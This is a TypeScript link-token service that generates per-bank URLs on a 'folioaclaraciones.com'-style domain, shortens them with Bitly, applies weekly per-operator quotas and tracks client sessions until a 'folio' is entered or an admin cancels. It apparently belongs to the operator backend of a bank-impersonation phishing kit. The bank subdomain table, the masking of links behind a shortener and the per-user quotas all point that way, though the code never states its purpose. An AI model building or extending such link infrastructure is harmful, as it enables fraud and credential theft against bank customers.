import { db } from '../db';
import { linkTokens, bankSubdomains, LinkStatus, type InsertLinkToken, siteConfig } from '../../shared/schema';
import { eq, and, lt, or, sql } from 'drizzle-orm';
import crypto from 'crypto';
import { bitlyService } from './bitly';
import { linkQuotaService } from './linkQuota';

export class LinkTokenService {
  generateToken(): string {
    return crypto.randomBytes(16).toString('hex');
  }

  async getBankSubdomain(bankCode: string): Promise<string | null> {
    const subdomain = await db.query.bankSubdomains.findFirst({
      where: and(
        eq(bankSubdomains.bankCode, bankCode),
        eq(bankSubdomains.isActive, true)
      )
    });

    return subdomain?.subdomain || null;
  }

  async createLink(data: {
    userId: number;
    bankCode: string;
    sessionId?: string;
    metadata?: any;
  }): Promise<{ 
    id: number;
    token: string; 
    originalUrl: string; 
    shortUrl: string | null;
    expiresAt: Date;
  }> {
    const quota = await linkQuotaService.checkQuota(data.userId);
    
    if (!quota.allowed) {
      throw new Error(`Has alcanzado el límite semanal de ${quota.limit} links. Límite se renueva el próximo lunes.`);
    }

    const token = this.generateToken();
    const expiresAt = new Date();
    // Expiración inicial de 24 horas - el timer de 1 hora comenzará cuando el usuario ingrese el folio
    expiresAt.setHours(expiresAt.getHours() + 24);

    // Obtener el dominio base de la configuración
    const config = await db.query.siteConfig.findFirst();
    const baseUrl = config?.baseUrl || 'https://folioaclaraciones.com';

    // Generar URL con banco en el path: dominio.com/bankCode/client/token
    const originalUrl = `${baseUrl}/${data.bankCode}/client/${token}`;

    let shortUrl: string | null = null;
    let bitlyLinkId: string | null = null;

    try {
      const bitlyResponse = await bitlyService.shorten({
        longUrl: originalUrl,
        title: `Link ${data.bankCode} - ${new Date().toLocaleDateString()}`
      });
      
      shortUrl = bitlyResponse.link;
      bitlyLinkId = bitlyResponse.id;
    } catch (error) {
      console.error('Error al acortar link con Bitly:', error);
    }

    const [inserted] = await db.insert(linkTokens).values({
      userId: data.userId,
      sessionId: data.sessionId || null,
      bankCode: data.bankCode,
      token,
      originalUrl,
      shortUrl,
      bitlyLinkId,
      status: LinkStatus.ACTIVE,
      expiresAt,
      metadata: data.metadata || {}
    }).returning();

    try {
      await linkQuotaService.incrementUsage(data.userId);
    } catch (error) {
      console.error('[Links] Error incrementando cuota, pero link creado:', error);
    }

    return {
      id: inserted.id,
      token,
      originalUrl,
      shortUrl,
      expiresAt
    };
  }

  async validateAndConsumeToken(token: string, metadata?: any): Promise<{ 
    valid: boolean; 
    linkId?: number;
    bankCode?: string;
    sessionId?: string;
    createdBy?: string;
    reason?: 'not_found' | 'already_used' | 'expired' | 'cancelled';
    error?: string;
  }> {
    const link = await db.query.linkTokens.findFirst({
      where: eq(linkTokens.token, token)
    });

    if (!link) {
      return { valid: false, reason: 'not_found', error: 'Token no encontrado' };
    }

    if (link.status === LinkStatus.CONSUMED) {
      return { valid: false, reason: 'already_used', error: 'Este link ya fue usado' };
    }

    if (link.status === LinkStatus.CANCELLED) {
      return { valid: false, reason: 'cancelled', error: 'Este link fue cancelado' };
    }

    // NO validar expiración por tiempo - los links no expiran automáticamente
    // Solo se invalidan cuando: 1) se consume el token o 2) se cancela manualmente

    const now = new Date();
    // NO consumir el token aquí - solo actualizar metadata y último acceso
    // El token se consumirá cuando el usuario interactúe con la sesión
    const updatedMetadata = metadata ? { ...(link.metadata as any || {}), ...metadata, lastAccess: now.toISOString() } : link.metadata;
    
    await db.update(linkTokens)
      .set({ 
        metadata: updatedMetadata,
        updatedAt: now 
      })
      .where(eq(linkTokens.id, link.id));

    return {
      valid: true,
      linkId: link.id,
      bankCode: link.bankCode,
      sessionId: link.sessionId || undefined,
      createdBy: (link.metadata as any)?.createdBy || 'system'
    };
  }

  async consumeToken(token: string): Promise<void> {
    const now = new Date();
    await db.update(linkTokens)
      .set({ 
        status: LinkStatus.CONSUMED, 
        usedAt: now,
        updatedAt: now 
      })
      .where(eq(linkTokens.token, token));
  }

  async updateTokenSession(token: string, sessionId: string): Promise<void> {
    await db.update(linkTokens)
      .set({ 
        sessionId,
        updatedAt: new Date()
      })
      .where(eq(linkTokens.token, token));
  }

  async getLinkBySession(sessionId: string): Promise<{ id: number; token: string; status: string } | null> {
    const link = await db.query.linkTokens.findFirst({
      where: eq(linkTokens.sessionId, sessionId),
      columns: {
        id: true,
        token: true,
        status: true
      }
    });
    
    return link || null;
  }

  // MÉTODOS DE EXPIRACIÓN ELIMINADOS - Los links no expiran por tiempo
  // Solo se invalidan cuando: 1) usuario ingresa folio o 2) admin cancela manualmente

  async cancelLink(linkId: number): Promise<void> {
    // Obtener información del link antes de cancelarlo
    const link = await db.query.linkTokens.findFirst({
      where: eq(linkTokens.id, linkId)
    });

    if (link && link.bitlyLinkId) {
      // Eliminar el link de Bitly
      try {
        await bitlyService.delete(link.bitlyLinkId);
        console.log(`[Links] Link de Bitly ${link.bitlyLinkId} eliminado exitosamente`);
      } catch (error) {
        console.error(`[Links] Error al eliminar link de Bitly ${link.bitlyLinkId}:`, error);
      }
    }

    await db.update(linkTokens)
      .set({
        status: LinkStatus.CANCELLED,
        updatedAt: new Date()
      })
      .where(eq(linkTokens.id, linkId));
  }

  async getLinkHistory(userId: number, limit: number = 50): Promise<any[]> {
    const links = await db.query.linkTokens.findMany({
      where: eq(linkTokens.userId, userId),
      orderBy: (linkTokens, { desc }) => [desc(linkTokens.createdAt)],
      limit
    });

    // Los links no expiran por tiempo, solo devolver su estado actual
    return links.map(link => ({
      ...link,
      isExpired: link.status === LinkStatus.EXPIRED || link.status === LinkStatus.CANCELLED
    }));
  }
}

export const linkTokenService = new LinkTokenService();
